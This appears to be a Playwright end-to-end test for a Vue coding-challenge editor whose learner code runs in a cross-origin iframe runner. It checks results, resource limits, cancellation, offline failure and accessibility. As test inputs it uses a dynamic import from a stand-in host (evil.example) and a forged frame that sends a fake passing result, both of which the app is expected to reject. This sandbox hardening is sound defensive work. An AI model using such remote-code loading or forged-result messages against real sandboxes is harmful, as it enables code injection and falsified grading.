import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { readFile, mkdir } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import { extname, join } from 'node:path';
import test from 'node:test';
import { chromium } from '../node_modules/@playwright/test/index.mjs';
import { build, createServer as createViteServer } from '../node_modules/vite/dist/node/index.js';

const root = fileURLToPath(new URL('../', import.meta.url));
const listen = server => new Promise(resolve => server.listen(0, '127.0.0.1', () => resolve(server.address().port)));
const solution = await readFile(join(root, 'challenges/longest-window/solution.ts'), 'utf8');

test('Vue editor runs its current source through the cross-site iframe and renders honest accessible results', { timeout: 120000 }, async () => {
  let browser, app, config;
  const errors = [];
  const runner = createServer(async (req, res) => {
    const path = req.url === '/' ? '/index.html' : req.url;
    const headers = Object.assign({}, ...config.routes.filter(r => r.src && new RegExp(`^${r.src}$`).test(path)).map(r => r.headers));
    try {
      const body = await readFile(join(root, 'apps/runner/.vercel/output/static', path));
      res.writeHead(200, { ...headers, 'Content-Type': ({ '.html': 'text/html', '.js': 'text/javascript', '.wasm': 'application/wasm' })[extname(path)] ?? 'application/octet-stream' });
      res.end(body);
    } catch { res.writeHead(404, headers); res.end(); }
  });
  const previous = Object.fromEntries(['VITE_RUNNER_PARENT_ORIGIN', 'VITE_RUNNER_ORIGIN', 'LAB_RUNNER_LOCAL_TEST'].map(k => [k, process.env[k]]));
  try {
    const runnerOrigin = `http://runner.test:${await listen(runner)}`;
    app = await createViteServer({ configFile: join(root, 'vite.config.ts'),
      server: { host: '127.0.0.1', port: 0, allowedHosts: ['app.test'], watch: { ignored: ['**/apps/runner/.vercel/**', '**/output/**'] } },
      define: { 'import.meta.env.VITE_ENABLE_LOCAL_RUNNER': '"1"', 'import.meta.env.VITE_RUNNER_ORIGIN': JSON.stringify(runnerOrigin),
        'import.meta.env.VITE_SUPABASE_URL': 'undefined', 'import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY': 'undefined' },
      plugins: [{ name: 'local-runner-frame-policy', configureServer(server) {
        server.middlewares.use((_req, res, next) => {
          res.setHeader('Content-Security-Policy', `frame-src ${runnerOrigin}; object-src 'none'; base-uri 'self'`); next();
        });
      } }],
    });
    await app.listen();
    const appOrigin = `http://app.test:${app.httpServer.address().port}`;
    process.env.VITE_RUNNER_PARENT_ORIGIN = appOrigin; process.env.VITE_RUNNER_ORIGIN = runnerOrigin;
    process.env.LAB_RUNNER_LOCAL_TEST = '1';
    await build({ configFile: join(root, 'apps/runner/vite.config.ts'), logLevel: 'error' });
    config = JSON.parse(await readFile(join(root, 'apps/runner/.vercel/output/config.json'), 'utf8'));
    browser = await chromium.launch({ channel: process.env.PLAYWRIGHT_BROWSER_CHANNEL ?? 'msedge', headless: true,
      args: ['--no-proxy-server', '--host-resolver-rules=MAP app.test 127.0.0.1, MAP runner.test 127.0.0.1',
        `--unsafely-treat-insecure-origin-as-secure=${appOrigin},${runnerOrigin}`] });
    for (const viewport of [{ width: 1280, height: 900 }, { width: 390, height: 844 }]) {
      const context = await browser.newContext({ viewport });
      const page = await context.newPage();
      page.on('pageerror', error => errors.push(error.message));
      await page.goto(`${appOrigin}/challenges/longest-window`);
      const source = page.getByRole('textbox', { name: 'TypeScript source', exact: true });
      await source.waitFor();
      const run = page.getByRole('button', { name: 'Run tests', exact: true });
      const status = page.locator('#execution-status');
      assert.match(await status.textContent(), /Tests have not run/);
      const evaluate = async (text, expected) => {
        await source.fill(text);
        await run.focus(); await page.keyboard.press('Enter');
        await page.waitForFunction(expected => document.querySelector('#execution-status')?.textContent?.includes(expected), expected);
        assert.equal(await source.inputValue(), text);
        assert.equal(await status.getAttribute('aria-live'), 'polite');
        assert.equal(await run.evaluate(el => document.activeElement === el), true);
        assert.equal(await page.locator('iframe').count(), 0);
      };
      const resourceLimit = async (text, label, expected) => {
        await source.fill(text);
        await run.click();
        await page.waitForFunction(() => {
          const title = document.querySelector('#execution-status')?.textContent;
          return ['Code is unsupported', 'Execution failed', 'Run timed out', 'Compilation failed', 'Runner unavailable']
            .includes(title);
        }, null, { timeout: 20000 });
        const observed = (await status.textContent()).trim();
        assert.equal(observed, expected, `Unexpected ${label} failure classification`);
        assert.equal(await page.locator('iframe').count(), 0);
        console.log(`PASS bounded resource probe ${label}: ${observed}`);
      };
      await evaluate(solution, 'All 14 tests passed');
      // Exercise limits against the actual worker rather than relying only on policy unit tests.
      if (viewport.width === 1280) {
        await resourceLimit('export function longestWindow(){return "x".repeat(70000)}', 'output', 'Code is unsupported');
        await resourceLimit('export function longestWindow(){return new Array(10000000).fill(0)}', 'memory', 'Execution failed');
        await resourceLimit('export function longestWindow(){function f(): never {return f()} return f()}', 'stack', 'Execution failed');
        const oversize = 'export function longestWindow(){return {start:0,endExclusive:0}}' + ' '.repeat(32769);
        await resourceLimit(oversize, 'source', 'Code is unsupported');
        assert.match(await page.getByRole('list', { name: 'Run diagnostics' }).textContent(), /32 KiB/);
        await evaluate(solution, 'All 14 tests passed');
      }
      assert.equal(await page.getByRole('list', { name: 'Test case results' }).getByRole('listitem').count(), 14);
      await evaluate('export function longestWindow() { return { start: 0, endExclusive: 0 }; }', 'Tests failed');
      assert.match(await page.getByRole('list', { name: 'Test case results' }).textContent(), /Expected.*Actual/s);
      await evaluate('export const wrong: number = "wrong";', 'Compilation failed');
      await evaluate('import("https://evil.example/module.js")', 'Code is unsupported');
      await evaluate('export function longestWindow() { throw new Error("learner exception"); }', 'Execution failed');
      await evaluate('export function longestWindow() { while (true) {} }', 'Run timed out');

      await source.fill('export function longestWindow() { while (true) {} }'); await run.click();
      const cancel = page.getByRole('button', { name: 'Cancel test run' });
      await cancel.click();
      await page.waitForFunction(() => document.querySelector('#execution-status')?.textContent?.includes('Run cancelled'));
      assert.equal(await page.locator('iframe').count(), 0);
      assert.equal(await run.evaluate(el => document.activeElement === el), true);

      // Editing while the Worker runs removes its frame and invalidates this revision immediately.
      await source.fill('export function longestWindow() { while (true) {} }'); await run.click();
      await source.fill('newer exact buffer');
      await page.waitForFunction(() => document.querySelector('#execution-status')?.textContent?.includes('Source changed'));
      assert.equal(await page.locator('iframe').count(), 0);
      await evaluate(solution, 'All 14 tests passed');
      if (viewport.width === 1280) {
        // True network isolation: a completely offline child cannot load; retries do not reuse prior success.
        await context.setOffline(true);
        await source.fill(solution + ' ');
        await run.click();
        await page.waitForFunction(() => document.querySelector('#execution-status')?.textContent?.includes('Runner unavailable'), null, { timeout: 20000 });
        assert.equal(await page.locator('iframe').count(), 0);
        await context.setOffline(false);
        await evaluate(solution, 'All 14 tests passed');
        // Fresh and warm navigation must preserve exact-origin activation and honest result reporting.
        await page.reload();
        await page.getByRole('textbox', { name: 'TypeScript source', exact: true }).waitFor();
        await evaluate(solution, 'All 14 tests passed');
        // The live status is announced and reachable with the keyboard.
        assert.equal(await status.getAttribute('role'), 'status');
        await run.focus();
        await page.keyboard.press('Enter');
        await page.waitForFunction(() => document.querySelector('#execution-status')?.textContent?.includes('All 14 tests passed'));
        assert.equal(await run.evaluate(el => el === document.activeElement), true);
        assert.equal(await page.locator('iframe').count(), 0);
      }
      await source.fill('buffer preserved across modes');
      page.once('dialog', dialog => dialog.accept());
      await page.getByRole('button', { name: 'Learning mode', exact: true }).click();
      await page.getByRole('button', { name: 'Interview mode', exact: true }).click();
      assert.equal(await source.inputValue(), 'buffer preserved across modes');

      // A failed navigation must be recoverable without losing source or displaying a prior pass.
      await page.route(`${runnerOrigin}/`, route => route.abort(), { times: 1 });
      await source.fill(solution); await run.click();
      await page.waitForFunction(() => document.querySelector('#execution-status')?.textContent?.includes('Runner unavailable'), null, { timeout: 20000 });
      assert.equal(await source.inputValue(), solution);
      await evaluate(solution, 'All 14 tests passed');
      // A compromised frame can speak the protocol; an empty forged pass must still be rejected.
      await page.route(`${runnerOrigin}/`, route => route.fulfill({ contentType: 'text/html',
        headers: { 'Content-Security-Policy': `default-src 'none'; script-src 'nonce-fixture'; frame-ancestors ${appOrigin}` },
        body: `<script nonce="fixture">addEventListener('message', ({data:m}) => {
          if(m.kind==='handshake') parent.postMessage({protocol:1,kind:'handshake-ack',nonce:m.nonce}, ${JSON.stringify(appOrigin)});
          if(m.kind==='run') parent.postMessage({protocol:1,kind:'run-result',nonce:m.nonce,result:{
            contractVersion:'1.0.0',runId:m.runId,sourceRevision:m.sourceRevision,challengeId:m.challengeId,
            challengeVersion:m.challengeVersion,status:'passed',cases:[],diagnostics:[]}}, ${JSON.stringify(appOrigin)});
        }); parent.postMessage({protocol:1,kind:'ready'}, ${JSON.stringify(appOrigin)});</script>` }), { times: 1 });
      await evaluate(solution, 'Runner unavailable');
      await evaluate(solution, 'All 14 tests passed');
      const dimensions = await page.evaluate(() => ({ content: document.documentElement.scrollWidth, viewport: document.documentElement.clientWidth }));
      assert.ok(dimensions.content <= dimensions.viewport, JSON.stringify(dimensions));
      // Reduced CSS viewport exercises responsive reflow at zoom without bypassing media queries.
      if (viewport.width === 1280) {
        for (const width of [640, 320]) {
          await page.setViewportSize({ width, height: viewport.height });
          const zoom = await page.evaluate(() => {
            const doc = document.documentElement;
            return { content: doc.scrollWidth, viewport: doc.clientWidth };
          });
          assert.ok(zoom.content <= zoom.viewport, 'Horizontal reflow overflow at CSS width '
            + width + ': ' + JSON.stringify(zoom));
        }
        await page.setViewportSize(viewport);
      }
      await source.focus(); await page.keyboard.press('Tab');
      assert.equal(await source.evaluate(el => document.activeElement !== el), true);
      await mkdir(join(root, 'output/playwright'), { recursive: true });
      await page.screenshot({ path: join(root, `output/playwright/m3-task2-${viewport.width}.png`), fullPage: true });
      await context.close();
    }
    assert.deepEqual(errors, []);
    console.log('Desktop/mobile: actual pass/fail, semantic errors, policy, runtime, timeout, cancel, stale edits, forged pass, retry, keyboard and overflow checks passed.');
  } finally {
    await browser?.close(); await app?.close();
    await new Promise(resolve => { runner.close(resolve); runner.closeAllConnections(); });
    for (const [key, value] of Object.entries(previous)) { if (value === undefined) delete process.env[key]; else process.env[key] = value; }
  }
});
